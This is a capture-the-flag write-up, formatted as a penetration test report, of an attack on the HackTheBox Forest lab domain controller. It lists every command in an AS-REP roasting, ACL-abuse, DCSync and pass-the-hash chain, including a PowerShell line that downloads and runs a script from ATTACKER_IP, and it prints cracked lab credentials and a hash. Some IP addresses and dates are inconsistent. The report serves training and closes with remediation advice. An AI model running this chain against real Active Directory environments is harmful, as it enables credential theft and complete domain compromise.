# HTB Forest - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-2-25

---

## 0. Lesson Learned

Different enumeration protocols expose different views of Active Directory. If you rely on only one (like LDAP), you will miss things.

Not all AS-REP hashes are equal. The encryption type matters. AES etype 18 is slow and expensive to compute. RC4 type 23 is fast and crackable. Same password. Different encryption.

---

## 1. Executive Summary

An internal penetration test was conducted against the Windows Server 2016 Active Directory environment (HTB Forest). The objective was to identify vulnerabilities that would allow unauthorized access and privilege escalation to Domain Administrator level.

The assessment revealed a critical Active Directory misconfiguration involving Exchange-related security groups. An AS-REP roastable service account (`svc-alfresco`) was identified and cracked offline. Using valid credentials, further domain enumeration identified a privilege escalation path through:

- Account Operators group membership
- GenericAll rights over Exchange Windows Permissions
- WriteDACL over the domain object
- DCSync abuse

This chain ultimately allowed full domain compromise and extraction of NTLM hashes, including the Administrator account. The domain was fully compromised.

The environment is critically vulnerable due to improper group delegation and excessive domain-level privileges.

---

## 2. Scope

- **Target:** 10.129.241.116
- **Domain:** htb.local
- **Environment:** HackTheBox Forest (Retired Machine)
- **Testing Window:** 2026-2-19 to 2016-2-25
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.241.116 -T4 -oA forest_tcp -Pn
```

Key services identified:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 389/tcp - LDAP
- 445/tcp - SMB
- 3268/tcp - Global Catalog LDAP
- 5985/tcp - WinRM

The host was confirmed as a Domain Controller for `htb.local`.

Anonymous SMB login was permitted:

```
smbclient -L //10.129.241.116 -N
```

Anonymous LDAP bind was successful:

```
ldapsearch -x -H ldap://10.129.241.116 -s base namingcontexts
```

Result:

```
DC=htb,DC=local
```

## 5. Enumeration

LDAP User Enumeration

```
ldapsearch -x -H ldap://10.129.141.116 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName
```

Users identified:

- sebastien
- lucinda
- andy
- mark
- santi

User `svc-alfresco` was not visible via anonymous LDAP but was identified via RPC enumeration:

```
rpcclient -U "" -N 10.129.241.116

enumdomusers
```

Service account discovered:

- svc-alfresco

---

## 6. Initial Access

Kerberos pre-authentication was tested

```
kerbrute userenum -d htb.local --dc 10.129.241.116 users.txt
```

User `svc-alfresco` was found to not require pre-authentication.

AS-REP hash extracted:

```
GetNPUsers.py -no-pass -dc-ip 10.129.241.78 htb/svc-alfresco
```

Hash cracked using Hashcat (mode 18200):

```
hashcat -m 18200 asrep23.hash /usr/share/wordlists/rockyou.txt --force
```

Recovered credentials:

```
svc-alfresco : s3rvice
```

Clock skew corrected:

```
sudo ntpdate 10.129.241.116
```

WinRM login as svc-alfresco:

```
evil-winrm -i 10.129.241.116 -u svc-alfresco -p s3rvice
```

Successful low-level shell obtained.

---

## 7. Post-Exploitation

Manual enumeration revealed:

```
whoami /groups
```

Notable group membership:

- Account Operators
- Service Accounts
- Privileged IT Accounts

Domain group enumeration:

```
net group /domain
```

Exchange Windows Permissions group identified as interesting.

Bloodhound Collection:

```
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -dc FOREST.htb.local -ns 10.129.241.116 -c All --zip
```

Revealed the shortest path to Domain Admin:

```
svc-alfresco
→ Service Accounts
→ Privileged IT Accounts
→ Account Operators
→ GenericAll over Exchange Windows Permissions
→ WriteDACL over htb.local domain
→ DCSync capability
→ Domain Admin compromise
```

---

## 8. Privilege Escalation

Created user `johnwick` and added to Exchange Windows Permissions:

```
net user johnwick P@ssword1 /add /domain

net group "Exchange Windows Permissions" /add johnwick
```

Uploaded PowerView:

```
IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/PowerView.ps1')
```

Granted DCSync rights:

```
$pass = ConvertTo-SecureString 'P@ssword1' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('HTB\johnwick', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity johnwick -Rights DCSync
```

Administrator NTLM hash extracted:

```
secretsdump.py htb.local/johnwick:P@ssword1@10.129.241.116
```

Validated via CrackMapExec (Pwn3d!):

```
crackmapexec smb 10.129.241.116 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

Admin shell via Pass-the-Hash:

```
psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.241.116
```

SYSTEM shell obtained.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\svc-alfresco\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** AS-REP Roastable Service Account

**Severity:** Critical

**Description:**
A service account was configured without Kerberos preauthentication enabled, making it vulnerable to AS-REP roasting attacks.

**Impact:**
Attackers could request authentication material and perform offline password cracking without valid domain credentials, potentially leading to privilege escalation.

**Recommendation:**
Enforce Kerberos preauthentication for all accounts, audit for accounts with the UF_DONT_REQUIRE_PREAUTH flag set, and ensure strong, complex passwords are used for service accounts.

### **Finding:** Excessive Privileges via Exchange Windows Permissions

**Severity:** Critical

**Description:**
Members of the Exchange Windows Permissions group had excessive permissions on the domain object, including the ability to modify ACLs.

**Impact:**
Attackers could grant themselves DCSync rights and extract domain credentials, leading to full domain compromise.

**Recommendation:**
Remove unnecessary WriteDACL permissions on the domain object, audit Exchange-related security groups, and apply the principle of least privilege to delegated administrative roles.

### **Finding:** Over-Permissive Account Operators Membership

**Severity:** High

**Description:**
The Account Operators group contained users with excessive privileges, allowing modification of privileged domain groups.

**Impact:**
Attackers could manipulate group memberships and escalate privileges within the domain.

**Recommendation:**
Remove unnecessary users from the Account Operators group, carefully restrict delegated administration, and regularly audit privileged group memberships.

---

## 11. Appendix

PowerView (Dev Branch) -
[https://github.com/PowerShellMafia/PowerSploit/tree/dev](https://github.com/PowerShellMafia/PowerSploit/tree/dev)